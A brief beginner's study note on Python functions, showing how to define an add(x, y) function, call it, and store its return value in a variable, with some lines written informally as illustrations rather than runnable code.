#Functions is a block of organized and reusuable code that performs an action

#defining a function    def printMessage(inputArguments):

def functionName(params):

def add(x,y):
	return x + y

#calling a function
add(5,3)

#return a value
8

#can store in a variable
answer = add(100,20)
answer = 120

